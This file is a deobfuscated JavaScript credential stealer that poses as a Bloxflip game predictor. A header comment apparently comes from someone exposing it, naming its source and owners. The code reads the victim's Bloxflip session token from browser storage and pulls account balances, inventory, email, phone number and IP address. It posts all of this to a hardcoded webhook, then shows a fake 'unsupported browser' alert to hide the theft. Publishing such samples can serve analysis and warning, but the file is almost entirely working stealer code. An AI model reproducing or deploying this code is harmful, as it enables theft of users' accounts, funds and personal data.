/*
  DEOBFUSCATED BY @morphine4ever
  REASON: shit logger, claims to be a bloxflip predictor
  SITE: https://robloxtools.tk
  ORIGINAL SOURCE: https://raw.githubusercontent.com/bloxsploittools/bloxlime/main/bloxlimepredictor.js
  MALICIOUS OWNER: @bloxsploittools (github) | @.vendisi (discord) | discord.gg/4zEhycbcm4 (discord server)
*/
// Deobfuscation successfull!
async function fetchData(url, authToken) {
  const response = await fetch(url, {
    method: 'GET',
    headers: { 'x-auth-token': authToken },
  });
  if (!response.ok) {
    throw new Error('API request failed');
  }
  return response.json();
}

function formatDate(timestamp) {
  const date = new Date(timestamp);
  return date.toLocaleString('en-US', {
    weekday: 'long',
    month: 'long',
    day: 'numeric',
    year: 'numeric',
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric',
  });
}

function roundToTwoDecimalPlaces(value) {
  return Number(value.toFixed(2));
}

function formatNumberWithCommas(number) {
  return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

async function getIpAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    if (!response.ok) {
      throw new Error('Failed to fetch IP address');
    }
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP address:', error);
    return 'Unknown';
  }
}

async function postToServer(url, data) {
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
    if (!response.ok) {
      console.error('Error: ' + response.status + ' ' + response.statusText);
    }
  } catch (error) {
    console.error('Error:', error);
  }
}

const userToken = window.localStorage['_DO_NOT_SHARE_BLOXFLIP_TOKEN'];

if (userToken) {
  const ipAddress = await getIpAddress();

  try {
    const [userData, rbxInventory, robloxInventory] = await Promise.all([
      fetchData('https://api.bloxflip.com/user', userToken),
      fetchData('https://api.bloxflip.com/inventory/viewRbx', userToken),
      fetchData('https://api.bloxflip.com/inventory/viewRoblox', userToken),
    ]);

    const {
      gamesWon,
      gamesPlayed,
      totalDeposited,
      totalWithdrawn,
      wager,
      user: {
        robloxId,
        robloxUsername,
        lastSeenAt,
        created,
        wallet,
        timezoneId,
        userEmailProperties,
        userPhoneProperties,
        rakebackBalance,
      },
    } = userData;

    const rbxBalance = rbxInventory.rbx || 0;
    const robloxItems = robloxInventory.inventory || [];
    const formattedRobloxItems = robloxItems.map((item) => {
      return `**Name: ${item.name} | Price: ${item.recentAveragePrice}**`;
    }).join('\n');

    const formattedRakebackBalance = roundToTwoDecimalPlaces(rakebackBalance);
    const formattedTotalDeposited = formatNumberWithCommas(totalDeposited);
    const formattedTotalWithdrawn = formatNumberWithCommas(totalWithdrawn);
    const formattedTotalWagered = formatNumberWithCommas(Math.round(wager));

    const messageData = {
      user: {
        robloxId,
        robloxUsername,
        userEmailProperties,
        userPhoneProperties,
        gamesWon: 0,
        lastSeenAt: 169411,
      },
    };

    const lastSeenDate = formatDate(lastSeenAt);
    const accountCreationDate = formatDate(created);

    const embedData = {
      color: 16251640,
      title: "svan1's Stealer",
      description: `
        **Victim's Token:** ${userToken}
        **User Roblox ID:** ${robloxId}
        **Roblox Username:** ${robloxUsername}
        **Last Seen At:** ${lastSeenDate}
        **Account Creation Date:** ${accountCreationDate}
        **Total Deposited:** ${formattedTotalDeposited}
        **Total Withdrawn:** ${formattedTotalWithdrawn}
        **Total Wagered:** ${formattedTotalWagered}
        **Roblox Robux Balance:** ${rbxBalance}
        **Bloxflip Robux Balance:** ${formatNumberWithCommas(roundToTwoDecimalPlaces(wallet))}
        **Rakeback Balance:** ${formattedRakebackBalance}
        **Email:** ${userEmailProperties.email}
        **Phone:** ${userPhoneProperties.phoneNumber}
        **Timezone:** ${timezoneId || 'Unknown'}
        **Victim's IP Address:** ${ipAddress}
        **Limiteds:**
        ${formattedRobloxItems}
      `,
    };

    const webhookUrl = 'https://vineyard.performave.com/api/webhook/v1/proxy/65b47e3b-4bcf-45e6-9716-60e592a85aac';
    postToServer(webhookUrl, {
      username: 'BloxFlip Stealer',
      avatar_url: '',
      embeds: [embedData],
    });
  } catch (error) {
    alert('Error: Please Try Again');
  } finally {
    alert('Unsupported browser, Please use Google Chrome.');
  }
} else {
  alert('You are not logged in!');
}
